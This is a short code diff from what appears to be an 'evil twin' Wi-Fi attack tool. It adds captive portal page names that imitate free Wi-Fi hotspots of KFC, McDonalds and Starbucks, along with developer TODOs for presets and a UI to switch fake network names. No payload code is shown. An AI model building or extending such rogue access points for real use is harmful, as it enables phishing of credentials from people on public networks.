@@ -22,5 +22,9 @@ wifi_ssid = "Free wifi"
 
 wifi_names = ["Free Wifi", "KFC Wifi", "McDonalds Wifi", "Starbucks Free"]
 #                   0           1           2                   3
+captive_portal_names = ["Free Wifi.html", "KFC Wifi.html", "McDonalds Wifi.html", "Starbucks Free.html"]
+#                             0               1                2                         3
+#TODO: ADD presets for wifi names and captive portals -vojta
 
+#TODO: ADD to UI option to change wifi name and captive portal EATHER FROM PRESETS OR CUSTOM -vojta
 evil_twin_options = ['change ssid', 'start evil twin', 'stop evil twin']
